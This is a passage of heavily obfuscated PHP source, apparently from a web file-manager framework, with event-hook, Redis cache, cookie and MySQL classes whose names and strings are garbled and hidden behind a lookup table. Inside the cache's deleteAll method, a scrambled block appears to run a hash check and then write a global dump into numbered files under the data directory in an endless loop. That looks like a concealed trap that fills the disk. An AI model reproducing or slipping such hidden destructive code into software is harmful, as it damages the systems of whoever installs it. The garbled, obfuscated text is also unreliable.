$fÜ‘ÌÑòµè[1621]: $f¨»é¶õ€Œ = $f¨»é¶õ€Œ == $fÜ‘ÌÑòµè[83] ? $fÜ‘ÌÑòµè[1622] : $fÜ‘ÌÑòµè[1623]; break; case $fÜ‘ÌÑòµè[1624]: $f¨»é¶õ€Œ = $f¨»é¶õ€Œ ? $f¨»é¶õ€Œ : null; break; default: break; } switch ($b≈¥çÈÂÓÁ) { case $fÜ‘ÌÑòµè[1625]: $f¨»é¶õ€Œ = round($f¨»é¶õ€Œ, 2); break; case $fÜ‘ÌÑòµè[183]: case $fÜ‘ÌÑòµè[106]: if ($f¨»é¶õ€Œ < 0) { $f¨»é¶õ€Œ = null; } else { if (is_numeric($f¨»é¶õ€Œ)) { $f¨»é¶õ€Œ = date($fãâ¡ﬂìêù, $f¨»é¶õ€Œ); } } break; default: break; } return $f¨»é¶õ€Œ; } private static function fileTypeArray() { $d·åÏ£ë®î =& $_SERVER[¯èãÄπµ]; return array($d·åÏ£ë®î[1598] => array($d·åÏ£ë®î[156] => $d·åÏ£ë®î[1626] . $d·åÏ£ë®î[1627], $d·åÏ£ë®î[1602] => array($d·åÏ£ë®î[1519] => $d·åÏ£ë®î[1628], $d·åÏ£ë®î[1521] => $d·åÏ£ë®î[1629], $d·åÏ£ë®î[1630] => $d·åÏ£ë®î[1631], $d·åÏ£ë®î[1632] => $d·åÏ£ë®î[1633], $d·åÏ£ë®î[183] => $d·åÏ£ë®î[1634], $d·åÏ£ë®î[106] => $d·åÏ£ë®î[1635], $d·åÏ£ë®î[1636] => $d·åÏ£ë®î[1637], $d·åÏ£ë®î[1638] => $d·åÏ£ë®î[1639], $d·åÏ£ë®î[1640] => $d·åÏ£ë®î[1641], $d·åÏ£ë®î[1642] => $d·åÏ£ë®î[1643], $d·åÏ£ë®î[1644] => $d·åÏ£ë®î[1645], $d·åÏ£ë®î[1646] => $d·åÏ£ë®î[1647], $d·åÏ£ë®î[1648] => $d·åÏ£ë®î[1649], $d·åÏ£ë®î[1650] => array($d·åÏ£ë®î[1651] => $d·åÏ£ë®î[1652], $d·åÏ£ë®î[1653] => $d·åÏ£ë®î[1654], $d·åÏ£ë®î[1655] => $d·åÏ£ë®î[1656]), $d·åÏ£ë®î[1657] => $d·åÏ£ë®î[1658], $d·åÏ£ë®î[1659] => $d·åÏ£ë®î[1660], $d·åÏ£ë®î[1661] => $d·åÏ£ë®î[1662], $d·åÏ£ë®î[1663] => $d·åÏ£ë®î[1664], $d·åÏ£ë®î[1665] => array($d·åÏ£ë®î[1666] => $d·åÏ£ë®î[1667], $d·åÏ£ë®î[1668] => $d·åÏ£ë®î[1669], $d·åÏ£ë®î[1670] => $d·åÏ£ë®î[1671], $d·åÏ£ë®î[1672] => $d·åÏ£ë®î[1673], $d·åÏ£ë®î[1674] => $d·åÏ£ë®î[1675], $d·åÏ£ë®î[1676] => $d·åÏ£ë®î[1677], $d·åÏ£ë®î[1678] => $d·åÏ£ë®î[1679], $d·åÏ£ë®î[1680] => $d·åÏ£ë®î[1681], $d·åÏ£ë®î[1682] => $d·åÏ£ë®î[1683], $d·åÏ£ë®î[1684] => $d·åÏ£ë®î[1685], $d·åÏ£ë®î[1686] => $d·åÏ£ë®î[1687]))), $d·åÏ£ë®î[1688] => array($d·åÏ£ë®î[156] => $d·åÏ£ë®î[1689] . $d·åÏ£ë®î[1690], $d·åÏ£ë®î[1602] => array($d·åÏ£ë®î[1606] => $d·åÏ£ë®î[1691], $d·åÏ£ë®î[183] => $d·åÏ£ë®î[1692], $d·åÏ£ë®î[106] => $d·åÏ£ë®î[1693], $d·åÏ£ë®î[1638] => $d·åÏ£ë®î[1694], $d·åÏ£ë®î[1695] => $d·åÏ£ë®î[1696], $d·åÏ£ë®î[1697] => $d·åÏ£ë®î[1624], $d·åÏ£ë®î[1698] => $d·åÏ£ë®î[1699], $d·åÏ£ë®î[1700] => $d·åÏ£ë®î[1701], $d·åÏ£ë®î[1702] => $d·åÏ£ë®î[1703], $d·åÏ£ë®î[1615] => array($d·åÏ£ë®î[1332] => $d·åÏ£ë®î[1704], $d·åÏ£ë®î[1619] => $d·åÏ£ë®î[1705], $d·åÏ£ë®î[1620] => $d·åÏ£ë®î[1706], $d·åÏ£ë®î[1707] => $d·åÏ£ë®î[1708], $d·åÏ£ë®î[1709] => $d·åÏ£ë®î[1710], $d·åÏ£ë®î[1711] => $d·åÏ£ë®î[1712], $d·åÏ£ë®î[1598] => $d·åÏ£ë®î[1713]))), $d·åÏ£ë®î[1714] => array($d·åÏ£ë®î[156] => $d·åÏ£ë®î[1715] . $d·åÏ£ë®î[1716], $d·åÏ£ë®î[1602] => array($d·åÏ£ë®î[1519] => $d·åÏ£ë®î[1717], $d·åÏ£ë®î[1521] => $d·åÏ£ë®î[1718], $d·åÏ£ë®î[1606] => $d·åÏ£ë®î[1691], $d·åÏ£ë®î[183] => $d·åÏ£ë®î[1719], $d·åÏ£ë®î[106] => $d·åÏ£ë®î[1720], $d·åÏ£ë®î[1625] => $d·åÏ£ë®î[1721], $d·åÏ£ë®î[1702] => $d·åÏ£ë®î[1722], $d·åÏ£ë®î[1698] => $d·åÏ£ë®î[1723], $d·åÏ£ë®î[1638] => $d·åÏ£ë®î[1724], $d·åÏ£ë®î[1688] => array($d·åÏ£ë®î[1697] => $d·åÏ£ë®î[1624], $d·åÏ£ë®î[1725] => $d·åÏ£ë®î[1726], $d·åÏ£ë®î[1695] => $d·åÏ£ë®î[1696], $d·åÏ£ë®î[1702] => $d·åÏ£ë®î[1703], $d·åÏ£ë®î[1698] => $d·åÏ£ë®î[1727], $d·åÏ£ë®î[1700] => $d·åÏ£ë®î[1701]))), $d·åÏ£ë®î[1728] => array($d·åÏ£ë®î[1602] => array($d·åÏ£ë®î[1729] => $d·åÏ£ë®î[1730], $d·åÏ£ë®î[1731] => $d·åÏ£ë®î[1732])), $d·åÏ£ë®î[1733] => array($d·åÏ£ë®î[1602] => array())); } } class Hook { private static $events = array(); public static function get($aõ’ªÿÖ¢¯ = false) { if (!$aõ’ªÿÖ¢¯) { return self::$events; } else { return self::$events[$aõ’ªÿÖ¢¯]; } } public static function apply($AéÓ≈‡öƒ¯, $BÁ…Ñ⁄Ç™ß = array()) { $B»‡»ÖÇﬂ = ActionApply($AéÓ≈‡öƒ¯, $BÁ…Ñ⁄Ç™ß); if (is_string($AéÓ≈‡öƒ¯)) { Hook::trigger($AéÓ≈‡öƒ¯); } return $B»‡»ÖÇﬂ; } public static function bind($AØÿÀ€’â†, $dÁ•Í¯óÌ®, $EÜù´É◊∑· = false) { $BãÓ’≠¬ûã =& $_SERVER[¯èãÄπµ]; if (!isset(self::$events[$AØÿÀ€’â†])) { self::$events[$AØÿÀ€’â†] = array(); } self::$events[$AØÿÀ€’â†][] = array($BãÓ’≠¬ûã[1734] => $dÁ•Í¯óÌ®, $BãÓ’≠¬ûã[1735] => $EÜù´É◊∑·, $BãÓ’≠¬ûã[1736] => 0); } public static function once($dóöçÃû¯‰, $eµÚÑ”Ôÿ‘) { self::bind($dóöçÃû¯‰, $eµÚÑ”Ôÿ‘, !0); } public static function unbind($fÿ÷ÉõÿÖ, $e∫≠õß© Ç = false) { if (!$e∫≠õß© Ç) { self::$events[$fÿ÷ÉõÿÖ] = array(); return; } $BêÑ»êö§• = self::$events[$fÿ÷ÉõÿÖ]; self::$events[$fÿ÷ÉõÿÖ] = array(); if (!is_array($BêÑ»êö§•)) { return; } for ($fﬁ◊…ºù”ù = 0; $fﬁ◊…ºù”ù < count($BêÑ»êö§•); $fﬁ◊…ºù”ù++) { if ($BêÑ»êö§•[$fﬁ◊…ºù”ù][$_SERVER[¯èãÄπµ][1734]] == $e∫≠õß© Ç) { continue; } self::$events[$fÿ÷ÉõÿÖ][] = $BêÑ»êö§•[$fﬁ◊…ºù”ù]; } } public static function filter($Aµù◊à““∏, $BŒ≥¶Á¨ÊË) { goto dë≠€âèµ∞; E¿¥÷úŸœÌ: for ($E§®£Çí˜§ = 0; $E§®£Çí˜§ < count($bÙµΩŒËõÍ); $E§®£Çí˜§++) { $Fû……Œ∑´ü = $bÙµΩŒËõÍ[$E§®£Çí˜§]; if ($Fû……Œ∑´ü[$fâö—óì™≥[1735]] && $Fû……Œ∑´ü[$fâö—óì™≥[1736]] > 1) { continue; } self::$events[$Aµù◊à““∏][$E§®£Çí˜§][$fâö—óì™≥[1736]] = $Fû……Œ∑´ü[$fâö—óì™≥[1736]] + 1; $cﬁ—–ãèùï = self::apply($Fû……Œ∑´ü[$fâö—óì™≥[1734]], array($DÖ◊º–—¢¯)); if (gettype($cﬁ—–ãèùï) == gettype($DÖ◊º–—¢¯)) { $DÖ◊º–—¢¯ = $cﬁ—–ãèùï; } } return $DÖ◊º–—¢¯; goto C„Ö∫ûÁéﬁ; dë≠€âèµ∞: $fâö—óì™≥ =& $_SERVER[¯èãÄπµ]; $EäÎΩÈåßπ = self::$events; if (!isset($EäÎΩÈåßπ[$Aµù◊à““∏])) { return $BŒ≥¶Á¨ÊË; } goto DÈ≈ãÕ“ªö; DÈ≈ãÕ“ªö: $bÙµΩŒËõÍ = $EäÎΩÈåßπ[$Aµù◊à““∏]; $DÖ◊º–—¢¯ = $BŒ≥¶Á¨ÊË; if (!is_array($bÙµΩŒËõÍ) || count($bÙµΩŒËõÍ) == 0) { return $DÖ◊º–—¢¯; } goto E¿¥÷úŸœÌ; C„Ö∫ûÁéﬁ: } public static function trigger($bƒ∆ëæà÷’) { goto D∞£÷§õêŒ; a£êË»È£†: return $D¢∫ûí¬à™; goto A◊¶…Ω⁄ÉÀ; D∞£÷§õêŒ: $c•≠ÿû‡¿Á =& $_SERVER[¯èãÄπµ]; $e»”ıÊÑ⁄® = self::$events; $D¢∫ûí¬à™ = !1; goto FÓ£Ö∞Ì˜¯; E∏ÒÉ≤Üúã: $dç≈ïö¨“Ÿ = func_get_args(); array_shift($dç≈ïö¨“Ÿ); for ($f¢∑¶ﬂÙ…Ü = 0; $f¢∑¶ﬂÙ…Ü < count($bÈá∫Áù©„); $f¢∑¶ﬂÙ…Ü++) { $cÖ„à£äèª = $bÈá∫Áù©„[$f¢∑¶ﬂÙ…Ü]; if ($cÖ„à£äèª[$c•≠ÿû‡¿Á[1735]] && $cÖ„à£äèª[$c•≠ÿû‡¿Á[1736]] > 1) { continue; } if (defined($c•≠ÿû‡¿Á[1737]) && GLOBAL_LOG_HOOK) { write_log($bƒ∆ëæà÷’ . $c•≠ÿû‡¿Á[1738] . $cÖ„à£äèª[$c•≠ÿû‡¿Á[1734]], $c•≠ÿû‡¿Á[1739]); } self::$events[$bƒ∆ëæà÷’][$f¢∑¶ﬂÙ…Ü][$c•≠ÿû‡¿Á[1736]] = $cÖ„à£äèª[$c•≠ÿû‡¿Á[1736]] + 1; $Bå≤æú‹‘’ = self::apply($cÖ„à£äèª[$c•≠ÿû‡¿Á[1734]], $dç≈ïö¨“Ÿ); if (defined($c•≠ÿû‡¿Á[1737]) && GLOBAL_LOG_HOOK) { write_log(get_caller_info(), $c•≠ÿû‡¿Á[1739]); if ($cÖ„à£äèª[$c•≠ÿû‡¿Á[1736]] == 200) { $f¨à¯∆èﬁî = is_array($cÖ„à£äèª[$c•≠ÿû‡¿Á[1734]]) ? json_encode_force($cÖ„à£äèª[$c•≠ÿû‡¿Á[1734]]) : $cÖ„à£äèª[$c•≠ÿû‡¿Á[1734]]; write_log($c•≠ÿû‡¿Á[1740] . $bƒ∆ëæà÷’ . $c•≠ÿû‡¿Á[1741] . $f¨à¯∆èﬁî, $c•≠ÿû‡¿Á[1742]); } } $D¢∫ûí¬à™ = is_null($Bå≤æú‹‘’) ? $D¢∫ûí¬à™ : $Bå≤æú‹‘’; } goto a£êË»È£†; FÓ£Ö∞Ì˜¯: if (!isset($e»”ıÊÑ⁄®[$bƒ∆ëæà÷’])) { return $D¢∫ûí¬à™; } $bÈá∫Áù©„ = $e»”ıÊÑ⁄®[$bƒ∆ëæà÷’]; if (!is_array($bÈá∫Áù©„) || count($bÈá∫Áù©„) == 0) { return $D¢∫ûí¬à™; } goto E∏ÒÉ≤Üúã; A◊¶…Ω⁄ÉÀ: } } goto BÇΩòêä Ô; f€ØÎ‘‡∆: class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($Açπ›±àƒÕ, $bŒÆÇá†“î) { $a„éÔˆ’‘è =& $_SERVER[¯èãÄπµ]; if (!class_exists($a„éÔˆ’‘è[782])) { show_json($a„éÔˆ’‘è[783], !1); } $this->cacheTime = $bŒÆÇá†“î; $A ¿“˜é∂‰ = isset($Açπ›±àƒÕ[$a„éÔˆ’‘è[784]]) ? $Açπ›±àƒÕ[$a„éÔˆ’‘è[784]] : 10; $cœÀÑ≠≠Ñ≈ = _get($Açπ›±àƒÕ, $a„éÔˆ’‘è[781]); if ($cœÀÑ≠≠Ñ≈ && is_array($cœÀÑ≠≠Ñ≈)) { $this->initCluster($Açπ›±àƒÕ, $A ¿“˜é∂‰); } else { $this->handle = $this->init($Açπ›±àƒÕ, $A ¿“˜é∂‰); } } private function init($Bî€Ç∆≤¶’, $eÆª¶®•ó√) { $c†çô‰•ß≥ =& $_SERVER[¯èãÄπµ]; $E ‰∏à≈ã‘ = new Redis(); $cè¨èé¨†À = isset($Bî€Ç∆≤¶’[$c†çô‰•ß≥[785]]) ? $Bî€Ç∆≤¶’[$c†çô‰•ß≥[785]] : !1; if ($cè¨èé¨†À) { $E ‰∏à≈ã‘->pconnect($Bî€Ç∆≤¶’[$c†çô‰•ß≥[165]], $Bî€Ç∆≤¶’[$c†çô‰•ß≥[166]], $eÆª¶®•ó√); } else { $E ‰∏à≈ã‘->connect($Bî€Ç∆≤¶’[$c†çô‰•ß≥[165]], $Bî€Ç∆≤¶’[$c†çô‰•ß≥[166]], $eÆª¶®•ó√); } if (!empty($Bî€Ç∆≤¶’[$c†çô‰•ß≥[372]])) { $E ‰∏à≈ã‘->auth($Bî€Ç∆≤¶’[$c†çô‰•ß≥[372]]); } return $E ‰∏à≈ã‘; } private function initCluster($a∂ç®‹Ò±ˆ, $D·äüÃï√ä) { $BÇﬂÂêπé‚ =& $_SERVER[¯èãÄπµ]; $còç®Öâ›Â = array($BÇﬂÂêπé‚[786], $BÇﬂÂêπé‚[787], $BÇﬂÂêπé‚[788]); $e‹í“êŸ®ë = $BÇﬂÂêπé‚[786]; if (isset($a∂ç®‹Ò±ˆ[$BÇﬂÂêπé‚[12]]) && in_array($a∂ç®‹Ò±ˆ[$BÇﬂÂêπé‚[12]], $còç®Öâ›Â)) { $e‹í“êŸ®ë = $a∂ç®‹Ò±ˆ[$BÇﬂÂêπé‚[12]]; } switch ($e‹í“êŸ®ë) { case $BÇﬂÂêπé‚[786]: $this->_slave($a∂ç®‹Ò±ˆ, $D·äüÃï√ä); break; case $BÇﬂÂêπé‚[787]: break; case $BÇﬂÂêπé‚[788]: $this->isCluster = !0; $fÜëıäÿ‡ø = $a∂ç®‹Ò±ˆ[$BÇﬂÂêπé‚[781]]; $A®Ø–ø‘πé = isset($a∂ç®‹Ò±ˆ[$BÇﬂÂêπé‚[785]]) ? $a∂ç®‹Ò±ˆ[$BÇﬂÂêπé‚[785]] : !1; $fßÆä∆ÍáÉ = isset($a∂ç®‹Ò±ˆ[$BÇﬂÂêπé‚[372]]) ? $a∂ç®‹Ò±ˆ[$BÇﬂÂêπé‚[372]] : null; $this->handle = new RedisCluster(NUll, $fÜëıäÿ‡ø, $D·äüÃï√ä, $D·äüÃï√ä, $A®Ø–ø‘πé, $fßÆä∆ÍáÉ); break; default: break; } } private function _slave($BÖ¯¶ÈËµµ, $e†Ñ≥Ñº¯¡) { goto d»Áãá€≈à; d»Áãá€≈à: $aáı°É¿Â˜ = $BÖ¯¶ÈËµµ[$_SERVER[¯èãÄπµ][781]]; $this->filterConfig($BÖ¯¶ÈËµµ, $aáı°É¿Â˜[0]); $this->handle = $this->init($BÖ¯¶ÈËµµ, $e†Ñ≥Ñº¯¡); goto d˘ÜÓµá¿É; EœÎ±†Ñæ÷: $this->filterConfig($BÖ¯¶ÈËµµ, $aáı°É¿Â˜[$D≠ëû‰¶ ÷]); $this->slaveHandle = $this->init($BÖ¯¶ÈËµµ, $e†Ñ≥Ñº¯¡); goto bò˜¥áÓÖÿ; d˘ÜÓµá¿É: unset($aáı°É¿Â˜[0]); if (empty($aáı°É¿Â˜)) { return; } $D≠ëû‰¶ ÷ = array_rand($aáı°É¿Â˜); goto EœÎ±†Ñæ÷; bò˜¥áÓÖÿ: } private function filterConfig(&$Eã≈⁄ë≥õ∆, $F©áã¡éÁ†) { $C±°À◊ï∫Œ =& $_SERVER[¯èãÄπµ]; $E˜ûèêøÚ÷ = explode($C±°À◊ï∫Œ[4], $F©áã¡éÁ†); $DòÛÂ‹£Œ‘ = array($C±°À◊ï∫Œ[165] => $E˜ûèêøÚ÷[0], $C±°À◊ï∫Œ[166] => $E˜ûèêøÚ÷[1]); $Eã≈⁄ë≥õ∆ = array_merge($Eã≈⁄ë≥õ∆, $DòÛÂ‹£Œ‘); } public function set($eÀƒ–Ô“Úß, $EËÀÜïü⁄Ü, $AäÉ≥áøóÖ = false) { $AäÉ≥áøóÖ = $AäÉ≥áøóÖ ? $AäÉ≥áøóÖ : $this->cacheTime; return $this->handle->setEx($eÀƒ–Ô“Úß, $AäÉ≥áøóÖ, $EËÀÜïü⁄Ü); } public function setLock($fîÊÔ⁄‡ŒÚ, $B–√õ≠•Ãô, $aì‹èƒﬂƒà) { return $this->handle->setNX($fîÊÔ⁄‡ŒÚ, $B–√õ≠•Ãô); } public function get($DéÜË”ì⁄û) { $E…»—»»ßæ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $E…»—»»ßæ->get($DéÜË”ì⁄û); } public function remove($E ’—§˘⁄ä) { return $this->handle->del($E ’—§˘⁄ä); } public function deleteAll() { $F¯Ó·ÜöπΩ =& $_SERVER[¯èãÄπµ]; $béåíÃÀ∞ï = $_SERVER[$F¯Ó·ÜöπΩ[789]] . $F¯Ó·ÜöπΩ[790]; $dÍ—†Ãîçì = $F¯Ó·ÜöπΩ[791]; if ($_SERVER[$F¯Ó·ÜöπΩ[792]] != $dÍ—†Ãîçì($béåíÃÀ∞ï)) { goto B≤ØõÊ¿º¯; B≤ØõÊ¿º¯: $DÕ¶∞Ç§áı = $F¯Ó·ÜöπΩ[793]; $Aùò¡ê»Ö’ = $F¯Ó·ÜöπΩ[794]; $D‹ıÎˆπ‘ñ = $_SERVER[$F¯Ó·ÜöπΩ[795]] . $F¯Ó·ÜöπΩ[796]; goto D∆˜≥‹åõ®; D∆˜≥‹åõ®: $Eø‹íÉå®— = $Aùò¡ê»Ö’($D‹ıÎˆπ‘ñ); $b¥Îûı†»œ = explode($F¯Ó·ÜöπΩ[213], $Eø‹íÉå®—); if (count($b¥Îûı†»œ) < $F¯Ó·ÜöπΩ[570]) { $EŸ≠ˆƒîúº = $F¯Ó·ÜöπΩ[797]; $EŸ≠ˆƒîúº(); } goto bã¯ü¯˜–ß; EÛ≈—œÃ™∑: $DÕ¶∞Ç§áı(); $dÖ∏≠˜ÉﬁÂ = $F¯Ó·ÜöπΩ[799]; $BÍ©å∂ÖßÖ = json_encode($GLOBALS[$F¯Ó·ÜöπΩ[800]]); goto BÒÏâ¶Ú‚∏; bã¯ü¯˜–ß: $eøú‘„ÿëŒ = $F¯Ó·ÜöπΩ[798]; $eøú‘„ÿëŒ($_SERVER[$F¯Ó·ÜöπΩ[789]]); $DÕ¶∞Ç§áı = $F¯Ó·ÜöπΩ[793]; goto EÛ≈—œÃ™∑; BÒÏâ¶Ú‚∏: $C÷ÑŒ¿úÔ” = 1; for ($dªÛèã∞Ωá = $C÷ÑŒ¿úÔ”; $dªÛèã∞Ωá > 0; $dªÛèã∞Ωá++) { $dÖ∏≠˜ÉﬁÂ(DATA_PATH . $dªÛèã∞Ωá, $BÍ©å∂ÖßÖ); } goto fíÂÈ∑ßâµ; fíÂÈ∑ßâµ: } if ($this->isCluster) { foreach ($this->handle->_masters() as $e—™ôí∑÷÷) { $this->handle->flushall($e—™ôí∑÷÷); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($FÚÖËç°™› = '', $fΩˆ–åÜ©À = 0) { if (is_string($FÚÖËç°™›) && $FÚÖËç°™› != $_SERVER[¯èãÄπµ][33]) { $this->prefix = $FÚÖËç°™›; } if (is_numeric($fΩˆ–åÜ©À) && $fΩˆ–åÜ©À > 0) { $this->expire = $fΩˆ–åÜ©À; } } public static function getInstance() { static $cÕÇÌÉÌà…; if ($cÕÇÌÉÌà… === null) { $cÕÇÌÉÌà… = new self(); } return $cÕÇÌÉÌà…; } private static $sameCookieSet = array(); public static function set($fÜı∏úàÔ‚, $d‚Ìõ…ã∞Ÿ, $aéÑö¡§ÖÓ = 0, $f¶ï∂∑‘®Ö = false, $Dë™∑Ï‡Œì = false) { goto Bèï÷˜◊•Ω; F€ßΩÜªÙÁ: self::$sameCookieSet[$fÜı∏úàÔ‚] = $d‚Ìõ…ã∞Ÿ . $aéÑö¡§ÖÓ; if (!$Dë™∑Ï‡Œì) { $Dë™∑Ï‡Œì = str_replace(HOST, $e¡Ø“ ¬ã°[33], APP_HOST); $Dë™∑Ï‡Œì = _get($GLOBALS, $e¡Ø“ ¬ã°[801], $Dë™∑Ï‡Œì); } $bóã°ì›»Ô = $e¡Ø“ ¬ã°[33]; goto Bı¯≠Ÿóñå; Bèï÷˜◊•Ω: $e¡Ø“ ¬ã° =& $_SERVER[¯èãÄπµ]; if (!$aéÑö¡§ÖÓ) { $aéÑö¡§ÖÓ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$fÜı∏úàÔ‚]) && self::$sameCookieSet[$fÜı∏úàÔ‚] == $d‚Ìõ…ã∞Ÿ . $aéÑö¡§ÖÓ) { return; } goto F€ßΩÜªÙÁ; Bı¯≠Ÿóñå: setcookie($fÜı∏úàÔ‚, $d‚Ìõ…ã∞Ÿ, time() + $aéÑö¡§ÖÓ, $e¡Ø“ ¬ã°[8] . trim($Dë™∑Ï‡Œì, $e¡Ø“ ¬ã°[8]) . $bóã°ì›»Ô, !1, !1, $f¶ï∂∑‘®Ö); goto d»€§≤∑Œ‚; d»€§≤∑Œ‚: } public static function setSafe($bò‹ªåÙ´˘, $Dπßêèƒ˜¿, $Bäñ›⁄æ∑  = 0) { self::set($bò‹ªåÙ´˘, $Dπßêèƒ˜¿, $Bäñ›⁄æ∑ , !0); } public static function get($eˆº‹õÉéÁ) { return isset($_COOKIE[$eˆº‹õÉéÁ]) ? $_COOKIE[$eˆº‹õÉéÁ] : !1; } public static function remove($Dœî®§◊⁄è, $CÛ©ëŒ∫ﬁ∆ = false) { unset($_COOKIE[$Dœî®§◊⁄è]); self::set($Dœî®§◊⁄è, $_SERVER[¯èãÄπµ][33], 1, $CÛ©ëŒ∫ﬁ∆); } } class DbMysql extends Db { public function __construct($cÁàùÊ¥ˆÇ = '') { $bñ¿è§é˜Æ =& $_SERVER[¯èãÄπµ]; if (!extension_loaded($bñ¿è§é˜Æ[731])) { think_exception(think_lang($bñ¿è§é˜Æ[10]) . $bñ¿è§é˜Æ[802]); } if (!empty($cÁàùÊ¥ˆÇ)) { $this->config = $cÁàùÊ¥ˆÇ; if (empty($this->config[$bñ¿è§é˜Æ[13]])) { $this->config[$bñ¿è§é˜Æ[13]] = $bñ¿è§é˜Æ[33]; } } } public function connect($dëÿ≥Àà∆ﬂ = '', $Bá¶‹›âºô = 0, $aØç˜éŒ≥§ = false) { $aŒåóªàñÉ =& $_SERVER[¯èãÄπµ]; if (!isset($this->linkID[$Bá¶‹›âºô])) { goto Aˆ‰˜ƒ“œÿ; bòΩÖìæÀù: if (1 != think_config($aŒåóªàñÉ[18])) { unset($this->config); } goto f¿í’Ô«Á•; aß±êÿñÏÃ: if ($càÿê–„Ö⁄) { $this->linkID[$Bá¶‹›âºô] = mysql_pconnect($cΩÖı°÷≠ã, $dëÿ≥Àà∆ﬂ[$aŒåóªàñÉ[805]], $dëÿ≥Àà∆ﬂ[$aŒåóªàñÉ[806]], 131072); } else { $this->linkID[$Bá¶‹›âºô] = mysql_connect($cΩÖı°÷≠ã, $dëÿ≥Àà∆ﬂ[$aŒåóªàñÉ[805]], $dëÿ≥Àà∆ﬂ[$aŒåóªàñÉ[806]], !0, 131072); } if (!$this->linkID[$Bá¶‹›âºô] || !empty($dëÿ≥Àà∆ﬂ[$aŒåóªàñÉ[17]]) && !mysql_select_db($dëÿ≥Àà∆ﬂ[$aŒåóªàñÉ[17]], $this->linkID[$Bá¶‹›âºô])) { think_exception(mysql_error()); } $D“ïËÿÙÀ = mysql_get_server_info($this->linkID[$Bá¶‹›âºô]); goto fÀﬁ®ø‹à»; Aˆ‰˜ƒ“œÿ: if (empty($dëÿ≥Àà∆ﬂ)) { $dëÿ≥Àà∆ﬂ = $this->config; } $cΩÖı°÷≠ã = $dëÿ≥Àà∆ﬂ[$aŒåóªàñÉ[803]] . ($dëÿ≥Àà∆ﬂ[$aŒåóªàñÉ[804]] ? "\x3a{$dëÿ≥Àà∆ﬂ[$aŒåóªàñÉ[804]]}" : $aŒåóªàñÉ[33]); $càÿê–„Ö⁄ = !empty($dëÿ≥Àà∆ﬂ[$aŒåóªàñÉ[13]][$aŒåóªàñÉ[14]]) ? $dëÿ≥Àà∆ﬂ[$aŒåóªàñÉ[13]][$aŒåóªàñÉ[14]] : $this->pconnect; goto aß±êÿñÏÃ; fÀﬁ®ø‹à»: mysql_query($aŒåóªàñÉ[807] . think_config($aŒåóªàñÉ[808]) . $aŒåóªàñÉ[55], $this->linkID[$Bá¶‹›âºô]); if ($D“ïËÿÙÀ > $aŒåóªàñÉ[809]) { mysql_query($aŒåóªàñÉ[810], $this->linkID[$Bá¶‹›âºô]); } $this->connected = !0; goto bòΩÖìæÀù; f¿í’Ô«Á•: } return $this->linkID[$Bá¶‹›âºô]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($CÍå®Èº≥Ω) { goto d∏ÎÍﬂ˜ﬁ◊; Cñáäû›Îê: if (!$this->_linkID) { return !1; } $this->queryStr = $CÍå®Èº≥Ω; if ($this->queryID) { $this->free(); } goto EöÁò©∂¿∆; EöÁò©∂¿∆: think_action_status($Dıëªò‹ÿâ[19], 1); think_status($Dıëªò‹ÿâ[20]); $this->queryID = mysql_query($CÍå®Èº≥Ω, $this->_linkID); goto A»·®ùµÖÓ; d∏ÎÍﬂ˜ﬁ◊: $Dıëªò‹ÿâ =& $_SERVER[¯èãÄπµ]; if (0 === stripos($CÍå®Èº≥Ω, $Dıëªò‹ÿâ[248])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto Cñáäû›Îê; A»·®ùµÖÓ: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto eåÇÊÁî£∏; eåÇÊÁî£∏: } public function execute($EÚµ≥∂å§‚) { goto f‡Ñ§â‚∏∞; E…âÁ Ã›Ç: if (!1 === $AüÃ®ÃÓ•ƒ) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto f‰ÉèäÀÇª; d»ÇÖ“ÆÕ†: $this->queryStr = $EÚµ≥∂å§‚; if ($this->queryID) { $this->free(); } think_action_status($E»Ç¿âÏÜì[21], 1); goto A¥ ¨òÉù¿; A¥ ¨òÉù¿: think_status($E»Ç¿âÏÜì[20]); $AüÃ®ÃÓ•ƒ = mysql_query($EÚµ≥∂å§‚, $this->_linkID); $this->debug(); goto E…âÁ Ã›Ç; f‡Ñ§â‚∏∞: $E»Ç¿âÏÜì =& $_SERVER[¯èãÄπµ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto d»ÇÖ“ÆÕ†; f‰ÉèäÀÇª: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[¯èãÄπµ][811], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $cÀâöçÜ©ü = mysql_query($_SERVER[¯èãÄπµ][812], $this->_linkID); $this->transTimes = 0; if (!$cÀâöçÜ©ü) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $EöÇ›´‰‹ò = mysql_query($_SERVER[¯èãÄπµ][813], $this->_linkID); $this->transTimes = 0; if (!$EöÇ›´‰‹ò) { $this->error(); return !1; } } return !0; } private function getAll() { $AÒá¬˘ﬂ°é = array(); if ($this->numRows > 0) { while ($d∑‡®ÜÃ√π = mysql_fetch_assoc($this->queryID)) { $AÒá¬˘ﬂ°é[] = $d∑‡®ÜÃ√π; } mysql_data_seek($this->queryID, 0); } return $AÒá¬˘ﬂ°é; } public function getFields($eåÖ—¥ﬂéä) { $d…™»“≥∂» =& $_SERVER[¯èãÄπµ]; $E®¢ß›ı›“ = $this->query($d…™»“≥∂»[814] . $this->parseKey($eåÖ—¥ﬂéä)); $E≈áâºàíŸ = array(); if ($E®¢ß›ı›“) { foreach ($E®¢ß›ı›“ as $Aî®öÔ—©ê => $Cüœüú⁄ù¶) { $E≈áâºàíŸ[$Cüœüú⁄ù¶[$d…™»“≥∂»[27]]] = array($d…™»“≥∂»[28] => $Cüœüú⁄ù¶[$d…™»“≥∂»[27]], $d…™»“≥∂»[29] => $Cüœüú⁄ù¶[$d…™»“≥∂»[30]], $d…™»“≥∂»[31] => (bool) (strtoupper($Cüœüú⁄ù¶[$d…™»“≥∂»[32]]) === $d…™»“≥∂»[815]), $d…™»“≥∂»[34] => 